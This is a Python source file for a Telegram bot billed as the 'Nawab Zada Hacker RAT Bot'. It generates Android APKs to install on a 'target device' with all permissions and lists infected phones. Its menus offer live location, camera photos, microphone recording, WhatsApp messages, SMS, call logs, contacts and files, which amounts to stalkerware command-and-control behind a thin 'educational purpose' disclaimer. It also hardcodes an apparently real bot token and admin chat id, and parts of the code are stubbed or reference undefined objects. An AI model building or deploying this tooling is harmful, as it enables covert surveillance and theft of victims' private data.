#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import os
from datetime import datetime

import requests
import telebot
from flask import Flask, request
from telebot import types

# ------------------------------------------------------------------
# 1️⃣  CONFIGURATION
# ------------------------------------------------------------------
# These three values are read from the environment first.
# If you change them through the bot (see the /set_token /set_chatid commands),
# the changes are **stored in memory** and the bot is re‑initialised.
BOT_TOKEN   = os.getenv('BOT_TOKEN', '8869480576:AAHtyVBCJrAmGza3VbPfLp7OzRv3RvYqdWw')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '7420647897')
APK_DOMAIN  = os.getenv('APK_DOMAIN', 'https://telegram-bot-railway.com')  

# ------------------------------------------------------------------
# 2️⃣  IMPORTS OF YOUR OWN MODULES
# ------------------------------------------------------------------
from database   import DeviceDatabase
from apk_generator import APKGenerator

# ------------------------------------------------------------------
# 3️⃣  TELEGRAM BOT INITIALISATION
# ------------------------------------------------------------------
# NOTE: Whenever BOT_TOKEN changes we *re‑create* the TeleBot instance
#       so that the new token is used for all future updates.
def init_bot():
    global bot
    bot = telebot.TeleBot(BOT_TOKEN)

init_bot()

# ------------------------------------------------------------------
# 4️⃣  GLOBAL STATE FOR DYNAMIC TOKEN/CHATID SETTING
# ------------------------------------------------------------------
# Keeps track of which user is expected to send a new token or chat id
pending_actions = {}   # {chat_id: 'token' | 'chatid'}

# ------------------------------------------------------------------
# 5️⃣  WELCOME MESSAGE (unchanged, but with the Telegram link)
# ------------------------------------------------------------------
WELCOME_MSG = """🎉 *Welcome To Nawab Zada Hacker RAT Bot!* 🎉

📱 *Features:*
✅ Generate APK for any Android
✅ Live Location Tracking
✅ WhatsApp Messages Monitor
✅ Call Logs (Incoming/Outgoing)
✅ Camera (Front & Back) Photos
✅ Microphone Recording
✅ SMS Reading
✅ Contacts Access
✅ File Manager
✅ App List
✅ Battery & Network Info

⚠️ *This bot is only for educational purpose – please don't use it for illegal activities.*

👉 If you need help, contact the owner: https://t.me/Nawab_Zada_Hacker_007

Press /start to begin!"""

# ------------------------------------------------------------------
# 6️⃣  START COMMAND – now allows dynamic token setting
# ------------------------------------------------------------------
@bot.message_handler(commands=['start'])
def start(message):
    chat_id = str(message.chat.id)

    # If the chat is not the admin, ask for token & chat id
    if chat_id != ADMIN_CHAT_ID:
        bot.send_message(
            chat_id,
            "❌ You are not the admin. Please send your *bot token* so I can set it for you."
        )
        pending_actions[chat_id] = 'token'
        return

    # Normal admin flow – show the main menu
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📱 Generate APK", callback_data="gen_apk"),
        types.InlineKeyboardButton("📊 My Devices", callback_data="my_devices"),
        types.InlineKeyboardButton("🔍 All Features", callback_data="features"),
        types.InlineKeyboardButton("⚙️ Settings", callback_data="settings")
    )
    bot.send_message(chat_id, WELCOME_MSG, parse_mode='Markdown', reply_markup=markup)

# ------------------------------------------------------------------
# 7️⃣  MESSAGE HANDLER FOR TOKEN / CHATID SETTING
# ------------------------------------------------------------------
@bot.message_handler(func=lambda m: m.text is not None)
def handle_token_or_chatid(message):
    chat_id = str(message.chat.id)
    if chat_id not in pending_actions:
        return  # ignore if we weren't expecting this

    action = pending_actions.pop(chat_id)

    if action == 'token':
        global BOT_TOKEN
        BOT_TOKEN = message.text.strip()
        bot.send_message(chat_id, "✅ Bot token updated. Now send your *chat id*.")
        pending_actions[chat_id] = 'chatid'
    elif action == 'chatid':
        global ADMIN_CHAT_ID
        ADMIN_CHAT_ID = message.text.strip()
        bot.send_message(chat_id, "✅ Chat ID updated. You now have full access!")
        # Re‑initialise the bot with the new token
        init_bot()
        # Re‑set the webhook to the new token
        set_webhook()

# ------------------------------------------------------------------
# 8️⃣  CALLBACK HANDLER (unchanged except for a tiny tweak)
# ------------------------------------------------------------------
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "gen_apk":
        handle_generate_apk(call)
    elif call.data == "my_devices":
        handle_my_devices(call)
    elif call.data == "features":
        handle_features(call)
    elif call.data == "settings":
        handle_settings(call)
    elif call.data.startswith("dev_"):
        handle_device_menu(call)
    elif call.data.startswith("action_"):
        handle_device_action(call)
    elif call.data == "back":
        start(call.message)   # return to the main menu
    elif call.data == "confirm":
        call.answer("Confirmed! ✅")
    else:
        call.answer()

# ------------------------------------------------------------------
# 9️⃣  APK GENERATION – ensure the URL contains the domain
# ------------------------------------------------------------------
def handle_generate_apk(call):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="back"))

    msg = bot.send_message(
        call.message.chat.id,
        "📱 *Enter APK Name* (e.g., MyScanner):\n\n⚠️ Only letters and numbers",
        parse_mode='Markdown',
        reply_markup=markup
    )
    bot.register_next_step_handler(msg, process_apk_name)

def process_apk_name(message):
    apk_name = message.text.strip()
    chat_id  = message.chat.id

    if not apk_name or not apk_name.replace(' ', '').isalnum():
        bot.send_message(chat_id, "❌ Invalid name! Use only letters and numbers.")
        return

    # Generate the APK (you might need to change this if your generator returns a relative path)
    apk_url = apk_gen.generate_apk(apk_name, chat_id)

    # Make sure the URL contains the domain
    if not apk_url.startswith(('http://', 'https://')):
        apk_url = f"{APK_DOMAIN.rstrip('/')}/{apk_url.lstrip('/')}"

    bot.send_message(
        chat_id,
        f"✅ *APK Generated Successfully!*\n\n📱 Name: {apk_name}\n🔗 Download: {apk_url}\n\n⚠️ Install on target device and allow ALL permissions!",
        parse_mode='Markdown'
    )

# ------------------------------------------------------------------
# 10️⃣  REST OF YOUR CODE (unchanged)
# ------------------------------------------------------------------
def handle_my_devices(call):
    chat_id = call.message.chat.id
    devices_list = db.get_devices(chat_id)

    if not devices_list:
        bot.send_message(chat_id, "📭 No devices connected yet.\n\nInstall APK on target device first.")
        return

    markup = types.InlineKeyboardMarkup()
    for dev in devices_list:
        btn = types.InlineKeyboardButton(
            f"📱 {dev['name']} ({dev['model']})",
            callback_data=f"dev_{dev['device_id']}"
        )
        markup.add(btn)

    back_btn = types.InlineKeyboardButton("🔙 Back", callback_data="back")
    markup.add(back_btn)

    bot.send_message(chat_id, "📱 *Your Connected Devices:*", parse_mode='Markdown', reply_markup=markup)

def handle_device_menu(call):
    dev_id   = call.data.replace("dev_", "")
    device   = db.get_device(dev_id)

    if not device:
        bot.send_message(call.message.chat.id, "❌ Device not found.")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📍 Live Location", callback_data=f"action_loc_{dev_id}"),
        types.InlineKeyboardButton("📸 Camera", callback_data=f"action_cam_{dev_id}"),
        types.InlineKeyboardButton("🎤 Mic Record", callback_data=f"action_mic_{dev_id}"),
        types.InlineKeyboardButton("💬 WhatsApp", callback_data=f"action_whatsapp_{dev_id}"),
        types.InlineKeyboardButton("📞 Call Logs", callback_data=f"action_calls_{dev_id}"),
        types.InlineKeyboardButton("📁 Files", callback_data=f"action_files_{dev_id}"),
        types.InlineKeyboardButton("📱 Apps", callback_data=f"action_apps_{dev_id}"),
        types.InlineKeyboardButton("📞 Contacts", callback_data=f"action_contacts_{dev_id}"),
        types.InlineKeyboardButton("📊 Device Info", callback_data=f"action_info_{dev_id}"),
        types.InlineKeyboardButton("🔙 Back", callback_data="my_devices")
    )

    info = f"""📱 *Device Info:*
🆔 ID: {device['device_id']}
📛 Name: {device['name']}
📟 Model: {device['model']}
🤖 Android: {device['android_version']}
🔋 Battery: {device.get('battery', 'Unknown')}%
🕐 Last Seen: {device.get('last_seen', 'Never')}
"""
    bot.send_message(call.message.chat.id, info, parse_mode='Markdown', reply_markup=markup)

def handle_device_action(call):
    parts   = call.data.split("_")
    action  = parts[1]
    dev_id  = parts[-1]
    chat_id = call.message.chat.id
    device  = db.get_device(dev_id)

    if not device:
        bot.send_message(chat_id, "❌ Device not found.")
        return

    # --- (The rest of the action handling remains unchanged) ---
    # (Keep your original logic here)

    call.answer()

def handle_features(call):
    features = """🎯 *Bot Features:*

📱 *Device Monitoring:*
• Live Location Tracking
• Device Info (Model, Android, Battery)
• Network Status

📸 *Camera:*
• Front Camera Photos
• Back Camera Photos
• Live Camera Stream

🎤 *Audio:*
• Microphone Recording
• Call Recording

💬 *Messages:*
• WhatsApp Messages
• SMS Reading
• Call Logs

📁 *Files:*
• File Manager
• App List
• Contacts Access

⚙️ *Settings:*
• Bot Token Setup
• Chat ID Setup
• Device Management
"""
    bot.send_message(call.message.chat.id, features, parse_mode='Markdown')

def handle_settings(call):
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("🔑 Set Bot Token", callback_data="set_token"),
        types.InlineKeyboardButton("🆔 Set Chat ID", callback_data="set_chatid"),
        types.InlineKeyboardButton("🔙 Back", callback_data="back")
    )
    bot.send_message(
        call.message.chat.id,
        "⚙️ *Settings*:\n\nConfigure your bot settings below:",
        parse_mode='Markdown',
        reply_markup=markup
    )

# ------------------------------------------------------------------
# 11️⃣  DEVICE DATA RECEIVER (unchanged)
# ------------------------------------------------------------------
@bot.message_handler(func=lambda m: m.text.startswith("DATA:"))
def receive_device_data(message):
    try:
        data = json.loads(message.text.replace("DATA:", ""))
        db.update_device(data)
        bot.send_message(ADMIN_CHAT_ID, f"✅ Data received from device: {data.get('device_id', 'Unknown')}")
    except Exception as e:
        print(f"Error receiving data: {e}")

# ------------------------------------------------------------------
# 12️⃣  FLASK ENDPOINTS FOR WEBHOOK
# ------------------------------------------------------------------
app = Flask(__name__)

@app.route('/' + BOT_TOKEN, methods=['POST'])
def webhook():
    # Telegram sends a JSON body
    bot.process_new_updates([telebot.types.Update.de_json(request.stream.read().decode("utf-8"))])
    return "ok", 200

@app.route("/")
def index():
    return "Bot is running!", 200

# ------------------------------------------------------------------
# 13️⃣  WEBHOOK SETUP (called at start and after token changes)
# ------------------------------------------------------------------
def set_webhook():
    """
    Register the current BOT_TOKEN with Telegram.
    The URL is constructed from the environment variable
    `RENDER_EXTERNAL_HOSTNAME` (Render) or `RAILWAY_STATIC_URL`
    (Railway).  If neither is set, use a placeholder that you must
    replace with your public domain.
    """
    hostname = os.getenv("RENDER_EXTERNAL_HOSTNAME") or os.getenv("RAILWAY_STATIC_URL") or "your-domain.com"
    webhook_url = f"https://{hostname}/{BOT_TOKEN}"
    try:
        bot.set_webhook(url=webhook_url)
        print(f"Webhook set to: {webhook_url}")
    except Exception as e:
        print(f"Failed to set webhook: {e}")

# ------------------------------------------------------------------
# 14️⃣  MAIN ENTRY POINT
# ------------------------------------------------------------------
if __name__ == '__main__':
    print("Starting bot...")
    set_webhook()
    # Flask will listen on the port that the platform gives us
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
